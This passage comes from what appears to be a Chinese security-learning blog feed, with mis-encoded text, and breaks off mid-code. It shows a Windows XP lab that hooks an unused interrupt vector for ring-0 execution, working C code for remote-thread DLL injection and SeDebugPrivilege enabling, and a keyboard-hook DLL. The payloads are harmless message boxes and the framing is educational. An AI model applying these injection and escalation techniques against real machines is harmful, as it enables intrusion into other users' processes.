ä¸ºç»™è™šæ‹Ÿæœºå¼€ä¸ªä¸²è¡Œç«¯å£æ—¶å°±æ˜¯ç«¯å£1(ç«¯å£2çš„è¯ä¼šæ˜¾ç¤ºä¸²è¡Œç«¯å£2)</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526140611903.png" alt="image-20230526140611903"></p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Home Edition DEBUG&quot;</span> /noexecute=optin /fastdetect /debugport=COM1 /baudrate=<span class="number">115200</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥è¿è¡Œ msconfig éªŒè¯ä¸€ä¸‹</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526140205585.png" alt="image-20230526140205585"></p><p>windbgé…ç½®</p><blockquote><p>è¿™é‡Œçš„\.\pipe\com_2å°±æ˜¯é…ç½®çš„ç®¡é“åå­—</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;D:\Windows Kits\10\Debuggers\x64\windbg.exe&quot;</span> -b -k com:pipe,port=\\.\pipe\com_2,baud=<span class="number">115200</span>,resets=<span class="number">0</span> -y SRV*E:\WindbgSybols*https:<span class="comment">//msdl.microsoft.com/download/symbols</span></span><br></pre></td></tr></table></figure><p>**<code>GRMWDK_EN_7600_1.ISO</code>**windbg7600 (æ–°ç‰ˆè°ƒè¯•xpæ€»æ˜¯å‡ºç°å„ç§bug)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>https:<span class="comment">//www.microsoft.com/en-us/download/confirmation.aspx?id=11800</span></span><br><span class="line"><span class="number">2.</span>https:<span class="comment">//download.microsoft.com/download/4/A/2/4A25C7D5-EFBE-4182-B6A9-AE6850409A78/GRMWDK_EN_7600_1.ISO</span></span><br></pre></td></tr></table></figure><p>xuetrå·¥å…·</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">http://www.xuetr.com/</span><br></pre></td></tr></table></figure><p>vs2022å®‰è£…ä¸ªxpçš„å•ä¸ªç»„ä»¶ï¼Œåæ”¹è¿è¡Œåº“ï¼Œæ”¹åŸºå€å›ºå®š(åé¢ææƒè¦å›ºå®šåŸºå€)</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526200219936.png" alt="image-20230526200219936"></p><p>vs2022</p><p>c&#x2F;c++ä»£ç ç”Ÿæˆé‡Œ<img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230531145420975.png" alt="image-20230531145420975"></p><h2 id="ä¸­æ–­ææƒ"><a href="#ä¸­æ–­ææƒ" class="headerlink" title="ä¸­æ–­ææƒ"></a>ä¸­æ–­ææƒ</h2><p>å‰ç½®çŸ¥è¯†ia32ä¿æŠ¤æ¨¡å¼ï¼Œä¸­æ–­å’Œå¼‚å¸¸ç­‰</p><p><a href="https://grxer.github.io/2023/04/08/32bit-x86-protected-mode/">https://grxer.github.io/2023/04/08/32bit-x86-protected-mode/</a></p><p><a href="https://grxer.github.io/2023/04/22/IA32-Interrupt-Exception/">https://grxer.github.io/2023/04/22/IA32-Interrupt-Exception/</a></p><p>å¾€æœªä½¿ç”¨çš„ä¸­æ–­å‘é‡è¡¨é‡Œå¡å…¥æˆ‘ä»¬è‡ªå·±çš„å‡½æ•°ç„¶åæ‰‹åŠ¨ä¸­æ–­åˆ°æˆ‘ä»¬çš„ä»£ç å°±å¯ä»¥è·å¾—0ç¯æ‰§è¡Œæƒé™</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526222003641.png" alt="image-20230526222003641"></p><p>windbgè°ƒè¯•</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r idtr</span><br><span class="line">idtr=<span class="number">8003f</span>400</span><br><span class="line">kd&gt; dq <span class="number">8003f</span>400</span><br><span class="line"><span class="number">8003f</span>400  <span class="number">80548e00</span>`<span class="number">00082190</span> <span class="number">80548e00</span>`<span class="number">0008230</span>c</span><br><span class="line"><span class="number">8003f</span>410  <span class="number">00008500</span>`<span class="number">0058112</span>e <span class="number">8054</span>ee00`<span class="number">00082720</span></span><br><span class="line"><span class="number">8003f</span>420  <span class="number">8054</span>ee00`<span class="number">000828</span>a0 <span class="number">80548e00</span>`<span class="number">00082</span>a00</span><br><span class="line"><span class="number">8003f</span>430  <span class="number">80548e00</span>`<span class="number">00082b</span>74 <span class="number">80548e00</span>`<span class="number">000831</span>ec</span><br><span class="line"><span class="number">8003f</span>440  <span class="number">00008500</span>`<span class="number">00501188</span> <span class="number">80548e00</span>`<span class="number">000835f</span>0</span><br><span class="line"><span class="number">8003f</span>450  <span class="number">80548e00</span>`<span class="number">00083710</span> <span class="number">80548e00</span>`<span class="number">00083850</span></span><br></pre></td></tr></table></figure><blockquote><p>dbgé‡Œ r idtråªæ˜¾ç¤ºäº†é«˜32ä½çš„åŸºå€</p><p>r idtlå¯ä»¥æ˜¾ç¤ºç•Œé™</p></blockquote><p>å›é¡¾ä¸‹ä¸­æ–­é—¨æè¿°ç¬¦</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526221657750.png" alt="image-20230526221657750"></p><p>ç”±0å·é™¤0ä¸­æ–­ä¸ºä¾‹ ä»–çš„ä¸­æ–­å¤„ç†ç¨‹åºåœ°å€æ˜¯æ€ä¹ˆæ¥çš„</p><p>8003f400åœ°å€å¤„<code>80548e00 00082190</code>é«˜48-64ä½8054 + ä½0-15ä½2190 &#x3D; 0x80542190</p><p>20å·ä¸­æ–­æ˜¯æœªä½¿ç”¨çš„ï¼Œæˆ‘ä»¬å°±é€‰å–20å·ä¸­æ–­hook</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD g_tmp;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        push eax</span><br><span class="line">        mov eax,dword ptr ds:[<span class="number">0x8003f500</span>]</span><br><span class="line">        mov g_tmp,eax</span><br><span class="line">        pop eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,g_tmp);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>æ¥ä¸‹æ¥å»åœ¨dbgé‡Œä¿®æ”¹ä¸­æ–­å‘é‡è¡¨</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">eq <span class="number">8003f</span>500  <span class="number">0040</span>ee00`<span class="number">00081040</span></span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯DPLä½ï¼ŒDPLä½å¿…é¡»æ˜¯ä¸ªä¸‰ç¯æ ‡å¿—(11)ï¼Œç¡®ä¿ä¸‰ç¯ç¨‹åºå¯ä»¥è§¦å‘è¿™ä¸ªä¸­æ–­</p><p>0ç¯çš„è¯æˆ‘ä»¬3ç¯ç¨‹åºå»int 20ä¸­æ–­çš„è¯ï¼Œä¼šäº§ç”Ÿè¶Šæƒè®¿é—®çš„å¼‚å¸¸ï¼Œè¿™ä¹Ÿæ˜¯é˜²æ­¢æ¶æ„ç¨‹åºéšæ„è°ƒç”¨ç³»ç»Ÿè°ƒç”¨çš„æ–¹å¼ä¹‹ä¸€</p></blockquote><ol start="2"><li><p>ceå±…ç„¶ä¹Ÿå¯ä»¥æ”¹(ä¹‹å‰è¿˜çœ‹åˆ°ä»–å¯ä»¥åŠ é€Ÿç™¾åº¦ç½‘ç›˜ ã€‚ã€‚ã€‚)</p><p>æŠŠä¸‹é¢åœ¨è®¾ç½® å…¶ä»–é‡Œå‹¾ä¸Šï¼Œå°±å¯ä»¥æ”¹å†…æ ¸å†…å­˜äº†</p><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230527002007814.png" alt="image-20230527002007814"></p></li></ol><p>è®¿é—®æˆåŠŸï¼ŒIdtEntryå†…æŒ‡ä»¤è·å¾—0ç¯æƒé™</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ¨æ€Dllæ³¨å…¥å’Œå¸è½½(Dynamic DLL Injection And Unloading)</title>
      <link href="/2023/05/25/Dynamic-DLL-Injection-and-unloading/"/>
      <url>/2023/05/25/Dynamic-DLL-Injection-and-unloading/</url>
      
        <content type="html"><![CDATA[<h1 id="Dynamic-DLL-Injection-And-Unloading"><a href="#Dynamic-DLL-Injection-And-Unloading" class="headerlink" title="Dynamic DLL Injection And Unloading"></a>Dynamic DLL Injection And Unloading</h1><p>æåˆ°æ³¨å…¥æŠ€æœ¯ï¼Œç¬¬ä¸€æƒ³åˆ°çš„å¯èƒ½æ˜¯æ¸¸æˆå¤–æŒ‚(æˆ‘ç¬¬ä¸€æ¬¡å¬åˆ°æ³¨å…¥ä¹Ÿæ˜¯åœ¨å¤–æŒ‚ã€‚ã€‚ã€‚)ï¼Œç—…æ¯’ç­‰ç­‰ï¼Œä½†æ³¨å…¥ä¹Ÿä¼šè¢«åº”ç”¨åˆ°æ’ä»¶å¼€å‘ï¼Œåº”ç”¨æ‹“å±•ï¼Œä¿®å¤bugä¸Š</p><h2 id="è¿œç¨‹çº¿ç¨‹æ³¨å…¥"><a href="#è¿œç¨‹çº¿ç¨‹æ³¨å…¥" class="headerlink" title="è¿œç¨‹çº¿ç¨‹æ³¨å…¥"></a>è¿œç¨‹çº¿ç¨‹æ³¨å…¥</h2><ul><li><p>OpenProcess ç”¨å¾…æ³¨å…¥è¿›ç¨‹çš„idæ‹¿åˆ°å¥æŸ„</p></li><li><p>VirtualAllocEx æ³¨å…¥è¿›ç¨‹å†…ç”³è¯·è¿œç¨‹ä¸€å—è™šæ‹Ÿç©ºé—´</p></li><li><p>WriteProcessMemory å¾€è¿™å—è™šæ‹Ÿå†…å­˜å†™å…¥dllåç§°</p></li><li><p>GetModuleHandle è·å–kernel32.dllå¥æŸ„</p><blockquote><p>å¸¸è§çš„ç³»ç»Ÿæ¨¡å—kernel32.dll user32.dll gdi32.dll advapi32.dll shell32.dllç­‰åŠ è½½åˆ°å„ä¸ªè¿›ç¨‹è™šæ‹Ÿåœ°å€çš„åç§»æ˜¯ç›¸åŒçš„(è¿™ä¸ªåŸå› ä¹Ÿå°±å¯¼è‡´æˆ‘ä»¬32ä½æ³¨å…¥å™¨åªèƒ½æ³¨å…¥32ä½è¿›ç¨‹ï¼Œ64ä½åªèƒ½æ³¨å…¥64ä½è¿›ç¨‹)ï¼Œè¿™ä¸€ç‚¹è®©æˆ‘å¥½åƒæ˜ç™½äº†windows dllä¸ºä»€ä¹ˆé‡‡ç”¨ç›´æ¥ä¿®æ”¹å†…å­˜ä»£ç çš„åŸºå€é‡å®šä½ï¼Œä¸æ€•æµªè´¹å†…å­˜å—ï¼Ÿï¼Œè¿™æ ·çœ‹å¦‚æœåœ°å€ä¸€æ ·ï¼Œç›´æ¥åœ¨å†…å­˜ä¸­æ˜ å°„ä¸€ä»½å°±å¯ä»¥å¤šè¿›ç¨‹å…±äº«äº†ï¼Œ(ä¸è¿‡åœ¨å®éªŒ(xp sp3é‡Œ)ä¸­å‘ç°,æˆ–è€…è¯´æ˜¯å¤šä¸ªæœ¬æ¥æ˜ å°„åˆ°åŒä¸€å—ï¼ŒæŸä¸ªè¿›ç¨‹æ”¹æ—¶å¤åˆ¶ä¸€å—,<del>æ²¡æ•¢ç»™ç‰©ç†æœºæŒ‚å†…æ ¸è°ƒè¯•å™¨å»éªŒè¯</del>)</p><p>aslræ˜¯æ¯æ¬¡å¯åŠ¨ç³»ç»Ÿæ—¶ï¼Œç³»ç»Ÿæ¨¡å—åŠ è½½åŸºå€ä¼šå˜</p><p>æ„Ÿè§‰è¿™ç§æœºåˆ¶ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆlinuxçš„æœåŠ¡ç«¯ä¸ºä»€ä¹ˆä¼šwindowså®‰å…¨å¾ˆå¤šçš„åŸå› ä¹‹ä¸€</p></blockquote></li><li><p>GetProcAddressä»kernel32ä¸­è·å–LoadLibraryWå‡½æ•°åœ°å€</p></li><li><p>CreateRemoteThreadå‘è¿œç¨‹è¿›ç¨‹å¼€å¯è¿œç¨‹çº¿ç¨‹æ¥è°ƒç”¨LoadLibraryWæ³¨å…¥åˆ°è¿›ç¨‹ï¼Œè¿›ç¨‹æ‰§è¡ŒDllMain</p></li></ul><p>hack.dll</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line">HMODULE g_hMod;</span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lParam)</span> &#123;</span><br><span class="line">    TCHAR Path[MAX_PATH];</span><br><span class="line">    <span class="keyword">if</span> (!GetModuleFileName(g_hMod, Path, MAX_PATH))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>,<span class="string">L&quot;grxer&quot;</span>,Path,MB_OK);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    g_hMod = hModule;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        OutputDebugString(<span class="string">L&quot;hack.dll injection\n&quot;</span>);</span><br><span class="line">        HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Inject.exe</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line">BOOL <span class="title function_">Inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> &#123;</span><br><span class="line">    HANDLE hProcess;</span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">    LPVOID pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;open fail %d&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    _tprintf(<span class="string">L&quot;%p&quot;</span>, pRemoteBuf);</span><br><span class="line">    <span class="keyword">if</span> (pRemoteBuf == <span class="number">0</span>) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;%d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    WriteProcessMemory(hProcess, pRemoteBuf, (LPCVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line">    hMod = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">    hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _tprintf(<span class="string">L&quot;%s,%s&quot;</span>, argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!Inject((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>])) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å¦‚æœæ³¨å…¥å¦ä¸€å¸æˆ·æ‹¥æœ‰çš„è¿›ç¨‹å†…å­˜éœ€è¦å…ˆè·å¾—SeDebugæƒé™,éœ€è¦æˆ‘ä»¬æ³¨å…¥å™¨åœ¨ç®¡ç†å‘˜æƒé™ä¸‹åšææƒæ“ä½œ</strong></p><table><thead><tr><th><strong>SE_DEBUG_NAME</strong> TEXT (â€œSeDebugPrivilegeâ€)</th><th>è°ƒè¯•å’Œè°ƒæ•´å¦ä¸€å¸æˆ·æ‹¥æœ‰çš„è¿›ç¨‹å†…å­˜æ‰€å¿…éœ€çš„ã€‚ ç”¨æˆ·æƒé™ï¼šè°ƒè¯•ç¨‹åºã€‚</th></tr></thead></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> &#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,</span><br><span class="line">        &amp;hToken)) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">        lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">        &amp;luid))        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;tp,</span><br><span class="line">        <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">        (PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">        (PDWORD)<span class="literal">NULL</span>)) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!SetPrivilege(SE_DEBUG_NAME, TRUE))</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="å…¨å±€æ¶ˆæ¯é’©å­æ³¨å…¥"><a href="#å…¨å±€æ¶ˆæ¯é’©å­æ³¨å…¥" class="headerlink" title="å…¨å±€æ¶ˆæ¯é’©å­æ³¨å…¥"></a>å…¨å±€æ¶ˆæ¯é’©å­æ³¨å…¥</h2><p><img src="/2023/05/25/Dynamic-DLL-Injection-and-unloading/image-20230526000213620.png" alt="image-20230526000213620"></p><p>ç”¨SetWindowsHookExæŠŠé’©å­æŒ‚å…¥é’©é“¾</p><p>åŒæ ·æ˜¯32ä½ç¨‹åºåªèƒ½ç»™32ä½ç¨‹åºæŒ‚é’©å­</p><p>KeyHook.dll</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_PROCESS_NAME        <span class="string">L&quot;notepad.exe&quot;</span></span></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;    </span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">HWND g_hWnd = <span class="literal">NULL</span>;</span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        g_hInstance = hModule;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">LRESULT CALLBACK <span class="title function_">KeyboardProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">    TCHAR szPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    TCHAR* p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nCode &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// bit 31 : 0 =&gt; press, 1 =&gt; release</span></span><br><span class="line">        <span class="keyword">if</span> (!(lParam &amp; <span class="number">0x80000000</span>)) &#123;</span><br><span class="line">            GetModuleFileName(<span class="literal">NULL</span>, szPath, MAX_PATH);</span><br><span class="line">            p = _tcsrchr(szPath, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">            MessageBox(<span class="literal">NULL</span>, szPath, szPath, MB_OK);</span><br><span class="line">            <span class="comment">// æ¯”è¾ƒå½“å‰è¿›ç¨‹åç§°ï¼Œè‹¥ä¸ºnotepadï¼Œåˆ™æ¶ˆæ¯ä¸ä¼šä¼ é€’ç»™åº”ç”¨ç¨‹åº</span></span><br><span class="line">            <span class="keyword">if</span> (!_tcsicmp(p + <span class="number">1</span>, DEF_PROCESS_NAME))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// è‹¥énotepadï¼Œåˆ™ä¼ ç»™ä¸‹ä¸€ä¸ªç¨‹åº</span></span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    __declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span><span class="comment">//è¿™ä¸ªå‡½æ•°è¦ä»æœ¬DLLå¯¼å‡ºã€‚æˆ‘è¦ç»™åˆ«äººç”¨ã€‚</span></span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>,<span class="string">L&quot;hook start&quot;</span>,<span class="string">L&quot;hook start&quot;</span>,MB_OK);</span><br><span class="line">        g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);<span class="comment">//g_hInstanceï¼šdllæ–‡ä»¶å¥æŸ„</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span><span class="comment">//è¿™ä¸ªå‡½æ•°è¦ä»æœ¬DLLå¯¼å‡ºã€‚æˆ‘è¦ç»™åˆ«äººç”¨ã€‚</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_hHook) &#123;</span><br><span 